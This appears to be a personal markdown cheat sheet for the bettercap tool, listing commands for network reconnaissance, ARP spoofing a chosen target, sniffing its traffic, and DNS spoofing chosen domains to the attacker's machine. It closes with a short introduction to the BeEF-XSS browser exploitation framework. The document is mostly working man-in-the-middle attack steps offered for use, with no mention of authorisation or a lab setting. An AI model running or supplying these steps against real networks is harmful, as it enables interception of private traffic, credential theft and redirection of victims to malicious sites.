# Bettercap - Network Recon & MITM attack tool

>  Main website is found here: [https://bettercap.org]([https://bettercap.org](https://bettercap.org))

Launch bettercap:

```shell
sudo bettercap
```

Launch a network probe (recon):

```shell
net.probe.on
```

This also shows all the available devices connected to the network

To show more information, i.e IP addresses and MAC addresses, on all devices in the network in a list:

```shell
net.show
```

---

## Arp Spoofing Attack

_This is an attack that tricks a targeted device connecting to the internet that it's communication is being routed by the router but in other words it is routed from an attacking machine_

Find and set a target machine:

```shell
set arp.spoof.target <IP_ADDRESS_HERE>
```

Launch the arp spoofing attack:

```shell
arp.spoof on
```

This will enable forwarding of network packets to the attacking machine.

Sniff on the traffic from target's machine after launching the arp spoof attack: 

```shell
net.sniff on
```

---

## DNS Spoofing

First turn off the sniffing:

```shell
net.sniff off
```

Redirecting urls of targeted URLs:

```shell
set dns.spoof.domains <YOUR_TARGET_DOMAIN_HERE>
# fakeamazon.com
```

You can setup a website for the target to be redirected to from the attaking machine using Apache service or any other of your interest. 

> **Note that it will be redirected to the attacker's machine IP address.**

Launch the DNS spoof attack:

```shell
dns.spoof on
```

---

# Advance Attack with Beef-XSS

### **Beef-xss** - the browser expoitation framework

_This tool can launch more sophisticated attacks from the browser once the targeted machine has been redirected to the attacker's malicious website._
